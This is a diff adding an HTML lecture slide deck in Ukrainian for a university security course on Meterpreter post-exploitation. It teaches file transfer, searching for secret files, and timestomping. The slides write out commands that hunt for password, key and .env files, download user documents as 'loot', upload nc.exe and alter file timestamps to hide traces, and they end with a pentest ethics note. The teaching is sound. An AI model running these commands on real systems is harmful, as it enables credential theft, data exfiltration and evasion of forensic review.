@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 9.4 — Файлові операції та пошук даних</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="9">
+  <div class="slide-deck">
+
+    <section class="slide active title-slide">
+      <h1>Файлові операції та пошук даних</h1>
+      <div class="subtitle">Тема 9.4 — Пост-експлуатація та Meterpreter</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <section class="slide">
+      <h2>Передача файлів та пошук</h2>
+
+      <div class="two-column" style="margin-top: 1rem;">
+        <div class="column">
+          <div class="card-blue">
+            <h3>Файлові команди</h3>
+            <div class="code-block" style="margin-top: 0.8rem; font-size: 0.7em;">
+# Навігація
+meterpreter&gt; pwd
+meterpreter&gt; cd C:\\Users
+meterpreter&gt; ls
+
+# Передача файлів
+meterpreter&gt; download
+  C:\\Users\\jsmith\\Documents\\
+  /tmp/loot/ -r
+meterpreter&gt; upload
+  /tmp/tools/nc.exe
+  C:\\Windows\\Temp\\
+
+# Читання
+meterpreter&gt; cat passwords.txt
+            </div>
+          </div>
+        </div>
+        <div class="column">
+          <div class="card-red">
+            <h3>Пошук цінних файлів</h3>
+            <div class="code-block" style="margin-top: 0.8rem; font-size: 0.7em;">
+# За розширенням
+meterpreter&gt; search -f *.kdbx
+meterpreter&gt; search -f *.txt
+  -d C:\\Users\\
+
+# За ім'ям
+meterpreter&gt; search -f *password*
+meterpreter&gt; search -f *secret*
+meterpreter&gt; search -f web.config
+meterpreter&gt; search -f .env
+meterpreter&gt; search -f id_rsa
+  -d /home/
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="card-yellow" style="margin-top: 1.5rem;">
+        <h3>Timestomping (T1070.006) — приховування слідів</h3>
+        <div class="code-block" style="margin-top: 0.8rem; font-size: 0.72em;">
+meterpreter&gt; timestomp C:\\Temp\\nc.exe -v          # Перегляд міток
+meterpreter&gt; timestomp C:\\Temp\\nc.exe -m "2023-01-15 08:30:00"   # Зміна Modified
+meterpreter&gt; timestomp C:\\Temp\\nc.exe -f C:\\Windows\\System32\\calc.exe  # Копіювати
+        </div>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>Цінні файли для збору</h2>
+
+      <table class="comparison-table" style="font-size: 0.82em; margin-top: 1rem;">
+        <thead>
+          <tr><th>Тип</th><th>Файли</th><th>Що шукаємо</th></tr>
+        </thead>
+        <tbody>
+          <tr><td><strong>Credentials</strong></td><td>*.txt, *.xlsx, *.kdbx</td><td class="cell-red">Паролі, ключі, токени</td></tr>
+          <tr><td><strong>Конфіги</strong></td><td>web.config, .env, *.conf</td><td class="cell-red">DB credentials, API keys</td></tr>
+          <tr><td><strong>SSH ключі</strong></td><td>id_rsa, *.pem</td><td class="cell-red">Приватні ключі</td></tr>
+          <tr><td><strong>Бази даних</strong></td><td>*.db, *.sqlite, *.mdb</td><td class="cell-yellow">Дані користувачів</td></tr>
+          <tr><td><strong>Бекапи</strong></td><td>*.bak, *.sql, *.dump</td><td class="cell-yellow">Database dumps</td></tr>
+          <tr><td><strong>Історія</strong></td><td>.bash_history, .zsh_history</td><td class="cell-blue">Виконані команди</td></tr>
+        </tbody>
+      </table>
+
+      <div class="warning-box" style="margin-top: 1.5rem;">
+        <strong>Етика:</strong> При пентесті збирайте лише <strong>докази доступу</strong> (перші рядки файлу, кількість записів), не ексфільтруйте реальні дані клієнтів.
+      </div>
+    </section>
+
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
